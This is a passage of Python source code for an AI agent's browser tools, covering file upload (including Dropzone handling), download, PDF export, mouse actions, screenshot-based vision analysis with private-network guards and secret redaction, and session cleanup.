        response = {"success": False, "error": result.get("error", "Failed to close tab")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    response = {"success": True, "action": "close"}
    if validated_index is not None:
        response["closed_index"] = validated_index
    else:
        response["closed_active"] = True
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_upload(ref: str, path: Optional[str] = None, paths: Optional[List[str]] = None, task_id: Optional[str] = None) -> str:
    """Upload one or more local files via a file input element."""
    # Validate paths/target before dispatching so both backends share identical
    # validation and the LLM-facing response shape is backend-independent.
    normalized_paths, error = _normalize_upload_paths(path=path, paths=paths)
    if error:
        return json.dumps({"success": False, "error": error}, ensure_ascii=False)

    normalized_target = _normalize_upload_target(ref)

    if _is_camofox_mode():
        from tools.browser_camofox import camofox_upload
        return camofox_upload(normalized_target, normalized_paths, task_id=task_id)

    effective_task_id = _last_session_key(task_id or "default")
    result = _run_browser_command(
        effective_task_id,
        "upload",
        [normalized_target, *normalized_paths],
        timeout=max(_get_command_timeout(), 60),
    )

    if result.get("success"):
        response = {
            "success": True,
            "element": normalized_target,
            "uploaded_paths": normalized_paths,
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    response = {
        "success": False,
        "error": result.get("error", f"Failed to upload files to {normalized_target}"),
    }
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_dropzone_upload(selector: Optional[str] = None, path: Optional[str] = None,
                            paths: Optional[List[str]] = None, task_id: Optional[str] = None) -> str:
    """Attach local files to a drag-and-drop uploader (Dropzone.js and similar).

    Use this instead of browser_upload when the target is a "drop files here"
    zone with no usable file input (the file input is hidden/managed by JS).
    ``selector`` is the dropzone element selector (default ``.dropzone``).
    """
    normalized_paths, error = _normalize_upload_paths(path=path, paths=paths)
    if error:
        return json.dumps({"success": False, "error": error}, ensure_ascii=False)

    drop_selector = (selector or ".dropzone").strip() or ".dropzone"

    if _is_camofox_mode():
        from tools.browser_camofox import camofox_dropzone_upload
        return camofox_dropzone_upload(drop_selector, normalized_paths, task_id=task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # Dropzone.js path (first): a real Dropzone widget keeps its <input
    # type=file> (class ``dz-hidden-input``) on document.body — NOT inside the
    # dropzone element — and ignores synthetic drop events, so the scoped-input
    # and synthetic-drop paths below both miss it. Detect the Dropzone instance
    # for the selector (the element itself, a nested ``.dropzone``, or
    # ``el.dropzone``), tag ITS hidden input, and upload to that. Verified
    # against Portad's justificatif dropzone.
    tag_js = (
        "(() => {"
        "if (typeof window.Dropzone === 'undefined') return JSON.stringify({ok:false, reason:'no-lib'});"
        f"const root = document.querySelector({json.dumps(drop_selector)});"
        "if (!root) return JSON.stringify({ok:false, reason:'no-selector'});"
        "let el = (root.classList && root.classList.contains('dropzone')) ? root : root.querySelector('.dropzone');"
        "let dz = null;"
        "try { if (el && window.Dropzone.forElement) dz = window.Dropzone.forElement(el); } catch(e){}"
        "if (!dz && root.dropzone) dz = root.dropzone;"
        "if (!dz && el && el.dropzone) dz = el.dropzone;"
        "if (!dz) return JSON.stringify({ok:false, reason:'no-instance'});"
        "const inp = dz.hiddenFileInput;"
        "if (!inp) return JSON.stringify({ok:false, reason:'no-hidden-input'});"
        "const prev = document.getElementById('hermes_dz_upload_target');"
        "if (prev && prev !== inp) prev.removeAttribute('id');"
        "inp.id = 'hermes_dz_upload_target';"
        "inp.style.cssText = 'display:block;visibility:visible;opacity:0;position:fixed;left:0;top:0;width:1px;height:1px';"
        "return JSON.stringify({ok:true});"
        "})()"
    )
    tag_result = _run_browser_command(effective_task_id, "eval", [tag_js])
    if tag_result.get("success"):
        try:
            tag_outcome = json.loads((tag_result.get("data", {}) or {}).get("result") or "{}")
        except (json.JSONDecodeError, TypeError):
            tag_outcome = {}
        if tag_outcome.get("ok"):
            up = _run_browser_command(
                effective_task_id, "upload",
                ["#hermes_dz_upload_target", *normalized_paths],
                timeout=max(_get_command_timeout(), 60),
            )
            if up.get("success"):
                # Give Dropzone a moment to run its change handler (accept +,
                # if autoProcessQueue, upload). Report the last file's status.
                status_js = (
                    "(() => {"
                    f"const root = document.querySelector({json.dumps(drop_selector)});"
                    "let el = (root && root.classList && root.classList.contains('dropzone')) ? root : (root && root.querySelector('.dropzone'));"
                    "let dz = null; try { dz = window.Dropzone.forElement(el); } catch(e){}"
                    "if (!dz && root && root.dropzone) dz = root.dropzone;"
                    "const f = dz && dz.files && dz.files[dz.files.length-1];"
                    "return JSON.stringify({n: dz? dz.files.length:0, name: f?f.name:null, status: f?f.status:null});"
                    "})()"
                )
                import time as _t
                dz_status = {}
                for _ in range(10):
                    _t.sleep(0.6)
                    sres = _run_browser_command(effective_task_id, "eval", [status_js])
                    try:
                        dz_status = json.loads((sres.get("data", {}) or {}).get("result") or "{}")
                    except (json.JSONDecodeError, TypeError):
                        dz_status = {}
                    if dz_status.get("status") in ("success", "error"):
                        break
                return json.dumps({
                    "success": dz_status.get("status") != "error",
                    "element": drop_selector,
                    "uploaded_paths": normalized_paths,
                    "method": "dropzone_js",
                    "dropzone_status": dz_status.get("status"),
                    "dropzone_file": dz_status.get("name"),
                }, ensure_ascii=False)

    # Dropzone widgets sometimes wrap a hidden <input type=file>. Try that
    # input, scoped to the dropzone so we never upload to an unrelated
    # file input elsewhere on the page. If the selector IS itself a file input,
    # target it directly. No page-wide fallback — a wrong-target upload is
    # worse than falling through to the synthetic drop below.
    candidates = [f"{drop_selector} input[type=file]"]
    if "input" in drop_selector.lower():
        candidates.append(drop_selector)
    upload_errors = []
    for candidate in candidates:
        result = _run_browser_command(
            effective_task_id, "upload", [candidate, *normalized_paths],
            timeout=max(_get_command_timeout(), 60),
        )
        if result.get("success"):
            return json.dumps({
                "success": True,
                "element": candidate,
                "uploaded_paths": normalized_paths,
                "method": "file_input",
            }, ensure_ascii=False)
        upload_errors.append(f"{candidate}: {result.get('error', 'failed')}")

    # Last resort: synthesize a real drop event with the file bytes embedded
    # as base64.  argv size limits (MAX_ARG_STRLEN ≈ 128 KiB per argument on
    # Linux) cap this path to small files.
    _SYNTH_DROP_MAX_BYTES = 90 * 1024
    total_size = 0
    for p in normalized_paths:
        try:
            total_size += os.path.getsize(p)
        except OSError as e:
            return json.dumps({"success": False, "error": f"Cannot read {p}: {e}"},
                              ensure_ascii=False)
    if total_size > _SYNTH_DROP_MAX_BYTES:
        return json.dumps({
            "success": False,
            "error": (
                "No usable file input found for the dropzone and the files are "
                f"too large ({total_size} bytes) for a synthetic drop event "
                f"(limit {_SYNTH_DROP_MAX_BYTES}). Tried: "
                + "; ".join(upload_errors)
            ),
        }, ensure_ascii=False)

    import base64
    import mimetypes
    files_payload = []
    for p in normalized_paths:
        with open(p, "rb") as fh:
            b64 = base64.b64encode(fh.read()).decode("ascii")
        mime = mimetypes.guess_type(p)[0] or "application/octet-stream"
        files_payload.append({"name": os.path.basename(p), "mime": mime, "b64": b64})

    drop_js = (
        "(() => {"
        f"const el = document.querySelector({json.dumps(drop_selector)});"
        "if (!el) return JSON.stringify({ok:false, error:'dropzone selector not found'});"
        f"const files = {json.dumps(files_payload)};"
        "const dt = new DataTransfer();"
        "for (const f of files) {"
        "  const bytes = Uint8Array.from(atob(f.b64), c => c.charCodeAt(0));"
        "  dt.items.add(new File([bytes], f.name, {type: f.mime}));"
        "}"
        "for (const type of ['dragenter', 'dragover', 'drop']) {"
        "  el.dispatchEvent(new DragEvent(type, {bubbles: true, cancelable: true, dataTransfer: dt}));"
        "}"
        "return JSON.stringify({ok: true});"
        "})()"
    )
    result = _run_browser_command(effective_task_id, "eval", [drop_js])
    if result.get("success"):
        try:
            outcome = json.loads((result.get("data", {}) or {}).get("result") or "{}")
        except (json.JSONDecodeError, TypeError):
            outcome = {}
        if outcome.get("ok"):
            return json.dumps({
                "success": True,
                "element": drop_selector,
                "uploaded_paths": normalized_paths,
                "method": "synthetic_drop",
            }, ensure_ascii=False)
        return json.dumps({
            "success": False,
            "error": outcome.get("error", "Synthetic drop was dispatched but not confirmed"),
        }, ensure_ascii=False)
    return json.dumps({
        "success": False,
        "error": result.get("error", "Synthetic drop failed. Tried: " + "; ".join(upload_errors)),
    }, ensure_ascii=False)


def browser_download(ref: str, path: Optional[str] = None, task_id: Optional[str] = None) -> str:
    """Download a file by clicking an element and saving it locally."""
    if _is_camofox_mode():
        return _camofox_browser_download(ref=ref, path=path, task_id=task_id)

    effective_task_id = _last_session_key(task_id or "default")
    normalized_ref = _normalize_ref(ref)
    target_path = _normalize_download_path(path)

    result = _run_browser_command(
        effective_task_id,
        "download",
        [normalized_ref, str(target_path)],
        timeout=max(_get_command_timeout(), 60),
    )

    if not result.get("success"):
        response = {"success": False, "error": result.get("error", f"Failed to download from {normalized_ref}")}
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    if not target_path.exists() or not target_path.is_file():
        response = {
            "success": False,
            "error": f"Download reported success but file was not found at {target_path}",
            "path": str(target_path),
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)

    response = {
        "success": True,
        "path": str(target_path),
        "exists": True,
        "element": normalized_ref,
    }
    return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_eval(expression: str, task_id: Optional[str] = None) -> str:
    """Evaluate JavaScript in the page (SSRF-guarded via _browser_eval)."""
    if not expression or not expression.strip():
        return json.dumps({"success": False, "error": "Empty expression"},
                          ensure_ascii=False)
    return _browser_eval(expression, task_id)


def browser_pdf(path: Optional[str] = None, task_id: Optional[str] = None) -> str:
    """Save the current page as a PDF file."""
    if _is_camofox_mode():
        return json.dumps({
            "success": False,
            "error": "browser_pdf is not supported on the Camofox backend.",
        }, ensure_ascii=False)

    effective_task_id = _last_session_key(task_id or "default")
    target_path = _normalize_download_path(path)
    if target_path.suffix.lower() != ".pdf":
        target_path = target_path.with_suffix(".pdf")

    result = _run_browser_command(
        effective_task_id, "pdf", [str(target_path)],
        timeout=max(_get_command_timeout(), 60),
    )
    if not result.get("success"):
        return json.dumps({
            "success": False,
            "error": result.get("error", "Failed to save page as PDF"),
        }, ensure_ascii=False)
    if not target_path.exists() or not target_path.is_file():
        return json.dumps({
            "success": False,
            "error": f"PDF reported success but file was not found at {target_path}",
        }, ensure_ascii=False)
    return json.dumps({
        "success": True,
        "path": str(target_path),
    }, ensure_ascii=False)


def browser_mouse(action: str, ref: Optional[str] = None,
                  selector: Optional[str] = None,
                  x: Optional[float] = None, y: Optional[float] = None,
                  button: Optional[str] = None,
                  task_id: Optional[str] = None) -> str:
    """Low-level mouse control: move, down, up, hover."""
    if _is_camofox_mode():
        return json.dumps({
            "success": False,
            "error": "browser_mouse is not supported on the Camofox backend.",
        }, ensure_ascii=False)

    effective_task_id = _last_session_key(task_id or "default")
    blocked = _blocked_private_page_action(effective_task_id, "mouse")
    if blocked is not None:
        return blocked

    action = (action or "").strip().lower()
    if action == "hover":
        target = _normalize_ref(ref) if ref else (selector or "").strip()
        if not target:
            return json.dumps({
                "success": False,
                "error": "hover requires a ref or a selector",
            }, ensure_ascii=False)
        result = _run_browser_command(effective_task_id, "hover", [target])
        if result.get("success"):
            return json.dumps({"success": True, "action": "hover", "element": target},
                              ensure_ascii=False)
        return json.dumps({
            "success": False,
            "error": result.get("error", f"Failed to hover {target}"),
        }, ensure_ascii=False)

    if action == "move":
        px, py, err = _resolve_viewport_point(
            effective_task_id, ref=ref, selector=selector, x=x, y=y)
        if err:
            return json.dumps({"success": False, "error": err}, ensure_ascii=False)
        result = _run_browser_command(
            effective_task_id, "mouse", ["move", _fmt_coord(px), _fmt_coord(py)])
        if result.get("success"):
            return json.dumps({"success": True, "action": "move", "x": px, "y": py},
                              ensure_ascii=False)
        return json.dumps({
            "success": False,
            "error": result.get("error", "Mouse move failed"),
        }, ensure_ascii=False)

    if action in ("down", "up"):
        args = [action] + ([button] if button else [])
        result = _run_browser_command(effective_task_id, "mouse", args)
        if result.get("success"):
            return json.dumps({"success": True, "action": action,
                               "button": button or "left"}, ensure_ascii=False)
        return json.dumps({
            "success": False,
            "error": result.get("error", f"Mouse {action} failed"),
        }, ensure_ascii=False)

    return json.dumps({
        "success": False,
        "error": f"Unknown mouse action {action!r} (want move, down, up, or hover)",
    }, ensure_ascii=False)


def _maybe_start_recording(task_id: str):
    """Start recording if browser.record_sessions is enabled in config."""
    with _cleanup_lock:
        if task_id in _recording_sessions:
            return
    try:
        from hermes_cli.config import read_raw_config
        hermes_home = get_hermes_home()
        cfg = read_raw_config()
        record_enabled = cfg_get(cfg, "browser", "record_sessions", default=False)

        if not record_enabled:
            return

        recordings_dir = hermes_home / "browser_recordings"
        recordings_dir.mkdir(parents=True, exist_ok=True)
        _cleanup_old_recordings(max_age_hours=72)

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        recording_path = recordings_dir / f"session_{timestamp}_{task_id[:16]}.webm"

        result = _run_browser_command(task_id, "record", ["start", str(recording_path)])
        if result.get("success"):
            with _cleanup_lock:
                _recording_sessions.add(task_id)
            logger.info("Auto-recording browser session %s to %s", task_id, recording_path)
        else:
            logger.debug("Could not start auto-recording: %s", result.get("error"))
    except Exception as e:
        logger.debug("Auto-recording setup failed: %s", e)


def _maybe_stop_recording(task_id: str):
    """Stop recording if one is active for this session."""
    with _cleanup_lock:
        if task_id not in _recording_sessions:
            return
    try:
        result = _run_browser_command(task_id, "record", ["stop"])
        if result.get("success"):
            path = result.get("data", {}).get("path", "")
            logger.info("Saved browser recording for session %s: %s", task_id, path)
    except Exception as e:
        logger.debug("Could not stop recording for %s: %s", task_id, e)
    finally:
        with _cleanup_lock:
            _recording_sessions.discard(task_id)


def browser_get_images(task_id: Optional[str] = None) -> str:
    """
    Get all images on the current page.

    Args:
        task_id: Task identifier for session isolation

    Returns:
        JSON string with list of images (src and alt)
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_get_images
        return camofox_get_images(task_id)

    effective_task_id = _last_session_key(task_id or "default")

    # Use eval to run JavaScript that extracts images
    js_code = """JSON.stringify(
        [...document.images].map(img => ({
            src: img.src,
            alt: img.alt || '',
            width: img.naturalWidth,
            height: img.naturalHeight
        })).filter(img => img.src && !img.src.startsWith('data:'))
    )"""

    result = _run_browser_command(effective_task_id, "eval", [js_code])

    if result.get("success"):
        # ── Private-network guard (sibling of snapshot/vision/eval guards) ──
        if _eval_ssrf_guard_active(effective_task_id):
            _blocked_url = _current_page_private_url(effective_task_id)
            if _blocked_url:
                return json.dumps({
                    "success": False,
                    "error": (
                        "Blocked: page URL targets a private or internal address "
                        f"({_blocked_url}). This may have been caused by a "
                        "JavaScript navigation via browser_console."
                    ),
                }, ensure_ascii=False)

        data = result.get("data", {})
        raw_result = data.get("result", "[]")

        try:
            # Parse the JSON string returned by JavaScript
            if isinstance(raw_result, str):
                images = json.loads(raw_result)
            else:
                images = raw_result

            response = {
                "success": True,
                "images": _redact_browser_output(images),
                "count": len(images)
            }
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
        except json.JSONDecodeError:
            response = {
                "success": True,
                "images": [],
                "count": 0,
                "warning": "Could not parse image data"
            }
            return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)
    else:
        response = {
            "success": False,
            "error": result.get("error", "Failed to get images")
        }
        return json.dumps(_copy_fallback_warning(response, result), ensure_ascii=False)


def browser_vision(question: str, annotate: bool = False, task_id: Optional[str] = None) -> Union[str, Dict[str, Any]]:
    """
    Take a screenshot of the current page for visual inspection.

    Captures what's visually displayed in the browser. When the active model
    supports native vision, the screenshot is attached directly to the
    conversation so the model can inspect it on the next turn; otherwise Hermes
    falls back to the auxiliary vision model and returns a text analysis. Useful
    for visual content the text-based snapshot may not capture (CAPTCHAs,
    verification challenges, images, complex layouts, etc.).

    The screenshot is saved persistently and its file path is returned so it
    can be shared with users via MEDIA:<path> in the response.

    Args:
        question: What you want to know about the page visually
        annotate: If True, overlay numbered [N] labels on interactive elements
        task_id: Task identifier for session isolation

    Returns:
        A JSON string with vision analysis results and screenshot_path, or a
        multimodal tool-result envelope carrying the screenshot and metadata.
    """
    if _is_camofox_mode():
        from tools.browser_camofox import camofox_vision
        return camofox_vision(question, annotate, task_id)

    import base64
    import uuid as uuid_mod
    from hermes_constants import get_hermes_dir
    screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
    screenshot_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
    effective_task_id = _last_session_key(task_id or "default")

    # ── Private-network guard: block vision from eval-navigated private pages ──
    # After any eval (browser_console) that may have changed location.href to a
    # private/internal address, the screenshot would expose private page content
    # to the vision model.  Re-check the current URL before capturing anything.
    if (
        not _is_local_backend()
        and not _is_local_sidecar_key(effective_task_id)
        and not _allow_private_urls()
    ):
        try:
            _url_result = _run_browser_command(
                effective_task_id, "eval", ["window.location.href"],
                timeout=5, _engine_override="auto",
            )
            if _url_result.get("success"):
                _current_url = (
                    _url_result.get("data", {}).get("result", "")
                    .strip().strip('"').strip("'")
                )
                if _current_url and not _is_safe_url(_current_url):
                    return json.dumps({
                        "success": False,
                        "error": (
                            "Blocked: page URL targets a private or internal address "
                            f"({_current_url}). This may have been caused by a "
                            "JavaScript navigation via browser_console."
                        ),
                    }, ensure_ascii=False)
        except Exception as _url_exc:
            logger.debug("browser_vision: URL safety check failed (%s)", _url_exc)

    # Lightpanda has no graphical renderer — pre-route screenshots to Chrome
    # via the fallback helper instead of letting the normal path fail with a
    # CDP error or return a placeholder PNG.  The normal analysis path below
    # still owns base64 encoding, provider routing, resizing retry, redaction,
    # and response shape.
    engine = _get_browser_engine()
    _lp_prerouted = False
    _lp_fallback_warning = None
    if engine == "lightpanda" and _should_inject_engine(engine):
        logger.debug("browser_vision: pre-routing screenshot to Chrome (engine=lightpanda)")
        screenshot_args = []
        if annotate:
            screenshot_args.append("--annotate")
        fb_result = _chrome_fallback_screenshot(
            effective_task_id, screenshot_args, _get_command_timeout(),
        )
        fb_reason = "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture."
        fb_result = _annotate_lightpanda_fallback(fb_result, fb_reason)
        if fb_result.get("success"):
            _lp_prerouted = True
            _lp_fallback_warning = fb_result.get("fallback_warning")
            fb_path = fb_result.get("data", {}).get("path", "")
            if fb_path and os.path.exists(fb_path):
                from hermes_constants import get_hermes_dir
                screenshots_dir = get_hermes_dir("cache/screenshots", "browser_screenshots")
                screenshots_dir.mkdir(parents=True, exist_ok=True)
                import shutil as _shutil_vision
                persistent_path = screenshots_dir / f"browser_screenshot_{uuid_mod.uuid4().hex}.png"
                _shutil_vision.copy2(fb_path, persistent_path)
                screenshot_path = persistent_path
        else:
            logger.warning("Lightpanda Chrome fallback vision screenshot failed: %s", fb_result.get("error"))
            # Fall through to the normal screenshot path so _run_browser_command
            # can still produce the standard fallback metadata/error.
            _lp_prerouted = False

    try:
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        # Prune old screenshots (older than 24 hours) to prevent unbounded disk growth
        _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)

        if _lp_prerouted and screenshot_path.exists():
            result = {
                "success": True,
                "data": {
                    "path": str(screenshot_path),
                    "fallback_warning": _lp_fallback_warning,
                    "browser_engine": "chrome",
                    "browser_engine_fallback": {
                        "from": "lightpanda",
                        "to": "chrome",
                        "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                    },
                },
                "fallback_warning": _lp_fallback_warning,
                "browser_engine": "chrome",
                "browser_engine_fallback": {
                    "from": "lightpanda",
                    "to": "chrome",
                    "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                },
            }
        else:
            # Take screenshot using agent-browser
            screenshot_args = []
            if annotate:
                screenshot_args.append("--annotate")
            screenshot_args.append("--full")
            screenshot_args.append(str(screenshot_path))
            result = _run_browser_command(
                effective_task_id,
                "screenshot",
                screenshot_args,
                # If the Lightpanda pre-route already failed, force Chrome so
                # _run_browser_command doesn't trigger a redundant LP fallback.
                _engine_override="auto" if _lp_prerouted else None,
            )

        if not result.get("success"):
            error_detail = result.get("error", "Unknown error")
            _cp = _get_cloud_provider()
            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
            error_response = {
                "success": False,
                "error": f"Failed to take screenshot ({mode} mode): {error_detail}"
            }
            return json.dumps(_copy_fallback_warning(error_response, result), ensure_ascii=False)

        actual_screenshot_path = result.get("data", {}).get("path")
        if actual_screenshot_path:
            screenshot_path = Path(actual_screenshot_path)

        # Check if screenshot file was created
        if not screenshot_path.exists():
            _cp = _get_cloud_provider()
            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
            return json.dumps({
                "success": False,
                "error": (
                    f"Screenshot file was not created at {screenshot_path} ({mode} mode). "
                    f"This may indicate a socket path issue (macOS /var/folders/), "
                    f"a missing Chromium install ('agent-browser install'), "
                    f"or a stale daemon process."
                ),
            }, ensure_ascii=False)

        # NOTE: the full-resolution base64 encode is deliberately deferred.
        # The native fast path below sizes its own history-reuse embed via
        # _resize_image_for_vision (stat-based quick estimate — no full-res
        # encode when oversized), and only the aux-LLM fallback path needs
        # the one-shot full-res data URL.

        # Fast path: when native image routing is in effect for the active main
        # model, attach the screenshot directly instead of describing it through
        # an auxiliary vision LLM. The model inspects the pixels on its next
        # turn — no aux call, no information loss. Consistent with vision_analyze.
        from tools.vision_tools import (
            _EMBED_MAX_DIMENSION,
            _EMBED_TARGET_BYTES,
            _build_native_vision_tool_result,
            _resize_image_for_vision,
            _should_use_native_vision_fast_path,
        )

        if _should_use_native_vision_fast_path():
            # History-reuse cap (#92699): this embed is baked into the tool
            # result and re-sent on every later turn, exactly like
            # vision_analyze's native path — apply the same proactive resize
            # so full-res screenshots can't enter immutable history uncapped.
            # The helper's internal stat/dimension quick-estimate skips the
            # resize (and encodes directly) when the screenshot is already
            # under both caps, so no full-res base64 is built just to be
            # thrown away. Fail-open: without Pillow it falls back to the
            # raw bytes and the compressor's keep-newest pass still retires
            # stale embeds.
            data_url = _resize_image_for_vision(
                screenshot_path,
                mime_type="image/png",
                max_base64_bytes=_EMBED_TARGET_BYTES,
                max_dimension=_EMBED_MAX_DIMENSION,
                force_jpeg=True,
            )
            native_result = _build_native_vision_tool_result(
                image_url=str(screenshot_path),
                question=question,
                image_data_url=data_url,
                image_size_bytes=screenshot_path.stat().st_size,
            )
            meta = native_result.setdefault("meta", {})
            meta["screenshot_path"] = str(screenshot_path)
            if _lp_fallback_warning:
                meta["fallback_warning"] = _lp_fallback_warning
            if annotate and result.get("data", {}).get("annotations"):
                meta["annotations"] = result["data"]["annotations"]
            native_result["text_summary"] = (
                f"{native_result.get('text_summary', '')} "
                f"Screenshot path: {screenshot_path}"
            ).strip()
            return native_result

        vision_prompt = (
            f"You are analyzing a screenshot of a web browser.\n\n"
            f"User's question: {question}\n\n"
            f"Provide a detailed and helpful answer based on what you see in the screenshot. "
            f"If there are interactive elements, describe them. If there are verification challenges "
            f"or CAPTCHAs, describe what type they are and what action might be needed. "
            f"Focus on answering the user's specific question."
        )

        # Aux-LLM path: one-shot analysis, not baked into history — encode at
        # full resolution here (the pre-existing 5 MB oversize guard below
        # still applies).
        _screenshot_bytes = screenshot_path.read_bytes()
        _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
        data_url = f"data:image/png;base64,{_screenshot_b64}"

        # Use the centralized LLM router
        vision_model = _get_vision_model()
        logger.debug("browser_vision: analysing screenshot (%d bytes)",
                     len(_screenshot_bytes))

        # Read vision timeout/temperature from config (auxiliary.vision.*).
        # Local vision models (llama.cpp, ollama) can take well over 30s for
        # screenshot analysis, so the default timeout must be generous.
        vision_timeout = 120.0
        vision_temperature = 0.1
        try:
            from hermes_cli.config import load_config
            _cfg = load_config()
            _vision_cfg = cfg_get(_cfg, "auxiliary", "vision", default={})
            _vt = _vision_cfg.get("timeout")
            if _vt is not None:
                vision_timeout = float(_vt)
            _vtemp = _vision_cfg.get("temperature")
            if _vtemp is not None:
                vision_temperature = float(_vtemp)
        except Exception:
            pass

        call_kwargs = {
            "task": "vision",
            "messages": [
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": vision_prompt},
                        {"type": "image_url", "image_url": {"url": data_url}},
                    ],
                }
            ],
            "temperature": vision_temperature,
            "timeout": vision_timeout,
        }
        if vision_model:
            call_kwargs["model"] = vision_model
        # Try full-size screenshot; on size-related rejection, downscale and retry.
        try:
            response = _lazy_call_llm(**call_kwargs)
        except Exception as _api_err:
            from tools.vision_tools import (
                _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
            )
            if (_is_image_size_error(_api_err)
                    and len(data_url) > _RESIZE_TARGET_BYTES):
                logger.info(
                    "Vision API rejected screenshot (%.1f MB); "
                    "auto-resizing to ~%.0f MB and retrying...",
                    len(data_url) / (1024 * 1024),
                    _RESIZE_TARGET_BYTES / (1024 * 1024),
                )
                data_url = _resize_image_for_vision(
                    screenshot_path, mime_type="image/png")
                call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
                response = _lazy_call_llm(**call_kwargs)
            else:
                raise

        analysis = (response.choices[0].message.content or "").strip()
        # Redact secrets the vision LLM may have read from the screenshot.
        from agent.redact import redact_sensitive_text
        analysis = redact_sensitive_text(analysis)
        response_data = {
            "success": True,
            "analysis": analysis or "Vision analysis returned no content.",
            "screenshot_path": str(screenshot_path),
        }
        _copy_fallback_warning(response_data, result)
        # Include annotation data if annotated screenshot was taken
        if annotate and result.get("data", {}).get("annotations"):
            response_data["annotations"] = result["data"]["annotations"]
        return json.dumps(response_data, ensure_ascii=False)

    except Exception as e:
        # Keep the screenshot if it was captured successfully — the failure is
        # in the LLM vision analysis, not the capture.  Deleting a valid
        # screenshot loses evidence the user might need.  The 24-hour cleanup
        # in _cleanup_old_screenshots prevents unbounded disk growth.
        logger.warning("browser_vision failed: %s", e, exc_info=True)
        error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
        if screenshot_path.exists():
            error_info["screenshot_path"] = str(screenshot_path)
            error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
        _copy_fallback_warning(error_info, result if 'result' in locals() else {})
        return json.dumps(error_info, ensure_ascii=False)


def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24):
    """Remove browser screenshots older than max_age_hours to prevent disk bloat.

    Throttled to run at most once per hour per directory to avoid repeated
    scans on screenshot-heavy workflows.
    """
    key = str(screenshots_dir)
    now = time.time()
    if now - _last_screenshot_cleanup_by_dir.get(key, 0.0) < 3600:
        return
    _last_screenshot_cleanup_by_dir[key] = now

    try:
        cutoff = time.time() - (max_age_hours * 3600)
        for f in screenshots_dir.glob("browser_screenshot_*.png"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old screenshot %s: %s", f, e)
    except Exception as e:
        logger.debug("Screenshot cleanup error (non-critical): %s", e)


def _cleanup_old_recordings(max_age_hours=72):
    """Remove browser recordings older than max_age_hours to prevent disk bloat."""
    try:
        hermes_home = get_hermes_home()
        recordings_dir = hermes_home / "browser_recordings"
        if not recordings_dir.exists():
            return
        cutoff = time.time() - (max_age_hours * 3600)
        for f in recordings_dir.glob("session_*.webm"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old recording %s: %s", f, e)
    except Exception as e:
        logger.debug("Recording cleanup error (non-critical): %s", e)


# ============================================================================
# Cleanup and Management Functions
# ============================================================================

def is_persistent_browser_session(task_id: Optional[str] = None) -> bool:
    """True when the task's live browser session uses the persistent local
    profile (``features.persistent_profile``).

    The per-turn finalizer (``cleanup_task_resources``) must NOT reap such a
    session: killing the agent-browser daemon between turns tears down Helium
    (zygote "Connection reset by peer" crash) and drops in-memory page state,
    which breaks any MULTI-TURN browser task — e.g. a login that shows a 2FA
    checkpoint, ends the turn to ask the user for the code, and resumes on the
    next turn (the page is gone → re-login loop). The idle reaper
    (``browser.inactivity_timeout``) and gateway shutdown still reap it, so
    memory is freed once truly idle. Mirrors the ``is_persistent_env``
    exemption already applied to the VM/terminal side in
    ``cleanup_task_resources``.

    Checks exactly the session keys ``cleanup_browser(task_id)`` would reap
    (the task key, its ``::local`` sidecar, and the recorded last-active key),
    so the exemption is precise — cloud/ephemeral sessions are never spared.
    """
    tid = task_id or "default"
    candidate_keys = [tid, f"{tid}{_LOCAL_SUFFIX}"]
    recorded = _last_active_session_key.get(tid)
    if recorded and recorded not in candidate_keys:
        candidate_keys.append(recorded)
    with _cleanup_lock:
        for key in candidate_keys:
            info = _active_sessions.get(key)
            if info and info.get("features", {}).get("persistent_profile"):
                return True
    return False


def cleanup_browser(task_id: Optional[str] = None) -> None:
    """
    Clean up browser session(s) for a task.

    Called automatically when a task completes or when inactivity timeout is reached.
    Closes both the agent-browser/Browserbase session and Camofox sessions.

    When ``task_id`` is a bare task identifier (no ``::local`` suffix), reaps
    BOTH the cloud/primary session AND any hybrid-routing local sidecar that
    may have been spawned for LAN/localhost URLs in the same task.  When
    ``task_id`` already carries a ``::local`` suffix (called from the inactivity
    cleanup loop against a specific session key), reaps only that one.

    Args:
        task_id: Task identifier (or explicit session key)
    """
    if task_id is None:
        task_id = "default"

    # Expand to the full set of session keys to reap. For a bare task_id
    # that includes the cloud/primary key + the local sidecar if one exists.
    if _is_local_sidecar_key(task_id):
        session_keys = [task_id]
        bare_task_id = task_id[: -len(_LOCAL_SUFFIX)]
    else:
        session_keys = [task_id]
        sidecar_key = f"{task_id}{_LOCAL_SUFFIX}"
        with _cleanup_lock:
            if sidecar_key in _active_sessions:
                session_keys.append(sidecar_key)
        bare_task_id = task_id

    for session_key in session_keys:
        _cleanup_single_browser_session(session_key)

